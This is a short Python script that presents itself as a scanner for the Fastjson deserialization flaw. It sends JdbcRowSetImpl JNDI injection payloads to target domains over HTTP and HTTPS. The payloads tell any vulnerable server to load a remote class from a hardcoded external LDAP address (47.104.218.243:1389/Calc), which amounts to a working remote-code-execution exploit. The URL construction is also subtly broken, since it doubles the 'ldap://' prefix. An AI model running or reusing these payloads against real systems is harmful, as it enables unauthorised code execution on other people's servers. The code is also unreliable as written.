#!/usr/bin/python
#coding=utf-8

import requests

'''
检测fastjson反序列化漏洞，需要搭建远程服务器检测，如执行curl url命令，检测访问的地址
'''
class FastjsonScanner:
    
    def scanner_domain(self,domain):
        print("fasltjson扫描: "+domain)
        
        ldapurl="ldap://47.104.218.243:1389/Calc"
        
        CONFIG = {
            'url': domain,
            'headers': {'Content-Type': 'application/json'}
            }
        data1 = '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://' + ldapurl + '", "autoCommit":true}}'
        data2 = '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://' + ldapurl + '", "autoCommit":true}'
        
        url = CONFIG['url']
        headers = CONFIG['headers']
        
        try:
            requests.post(url="http://" + url, data=data1, headers=headers, timeout=1)
        except:
            print("[exception]http request exception " + url)

        try:
            requests.post(url="https://" + url, data=data1, headers=headers, timeout=1)
        except:
            print("[exception]https request exception " + url )
        
        try:
            requests.post(url="http://" + url, data=data2, headers=headers, timeout=1)
        except:
            print("[exception]http request exception " + url)

        try:
            requests.post(url="https://" + url, data=data2, headers=headers, timeout=1)
        except:
            print("[exception]http request exception " + url)
        
        print("fastjson scan end.")


        